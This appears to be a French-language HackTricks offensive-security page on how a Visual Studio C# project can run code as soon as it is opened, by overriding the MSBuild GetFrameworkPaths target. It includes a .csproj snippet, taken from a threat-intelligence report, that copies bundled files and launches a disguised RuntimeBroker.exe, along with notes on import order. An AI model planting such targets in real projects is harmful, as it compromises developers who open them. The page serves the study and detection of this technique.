# Exécution de MSBuild au moment de la conception d’un projet Visual Studio

{{#include ../banners/hacktricks-training.md}}

Ouvrir un projet C# dans Visual Studio n’est pas une simple lecture passive. Sa compilation au moment de la conception invoque des cibles MSBuild nommées pour initialiser IntelliSense, les références et le débogage **avant** que le développeur ne sélectionne Build ou Run. `GetFrameworkPaths` est l’une de ces cibles. Un projet qui la redéfinit peut transformer le chargement du projet en exécution de code dans le contexte de l’utilisateur, sans qu’il soit nécessaire de cliquer sur un payload distinct.<sup>[[1]](#references)[[2]](#references)</sup>

Le projet présenté déclarait des fichiers de ressources, puis utilisait `MakeDir`, `Copy` et `Exec` dans sa cible de remplacement pour préparer et lancer un payload placé à côté. Cet extrait réduit préserve le chemin d’exécution montré dans la figure 6 de la source ; il doit se trouver dans un fichier `.csproj`, et non dans un fichier XML autonome.<sup>[[1]](#references)</sup>

```xml
<ItemGroup>
  <ResourceFiles Include="Resources\**\*.*" />
</ItemGroup>
<Target Name="GetFrameworkPaths">
  <MakeDir Directories="$(LocalAppData)\Microsoft\RuntimeBrokers" />
  <Copy SourceFiles="@(ResourceFiles)"
        DestinationFolder="$(LocalAppData)\Microsoft\RuntimeBrokers\%(RecursiveDir)"
        SkipUnchangedFiles="true" />
  <Exec Command='start "" "$(LocalAppData)\Microsoft\RuntimeBrokers\RuntimeBroker.exe"' />
</Target>
```

**L’ordre d’importation compte :** MSBuild utilise la *dernière* définition d’une cible. Une cible écrite dans un fichier projet ne remplace pas nécessairement la cible Microsoft si un import ultérieur la redéfinit. Les projets de style SDK utilisant `<Project Sdk="...">` importent implicitement les cibles du SDK après le corps du projet. Il faut donc examiner l’ordre d’importation évalué plutôt que de supposer que cette redéfinition fonctionne dans tous les projets. `MSBuild.exe -preprocess:expanded.xml project.csproj` développe les imports sans générer le projet et peut aider à localiser la définition effective de la cible.<sup>[[3]](#references)[[4]](#references)</sup>

Il s’agit d’une surface d’exécution de projet développeur, et non de l’installation d’une extension VSIX ni, à elle seule, d’une élévation de privilèges. Si l’exécutable préparé utilise un fichier `.exe.config` adjacent malveillant ou une DLL malveillante, continuez avec [AppDomainManager hijacking and DLL sideloading](windows-local-privilege-escalation/dll-hijacking/).

## References

- [1] [Unit 42 - La campagne Blinder Tunnel cible les infrastructures irakiennes](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
- [2] [Microsoft Learn - Intégration à Visual Studio (MSBuild)](https://learn.microsoft.com/en-us/visualstudio/msbuild/visual-studio-integration-msbuild?view=visualstudio)
- [3] [Microsoft Learn - Cibles MSBuild](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-targets)
- [4] [Microsoft Learn - Référence de la ligne de commande MSBuild](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-command-line-reference?view=visualstudio)
{{#include ../banners/hacktricks-training.md}}
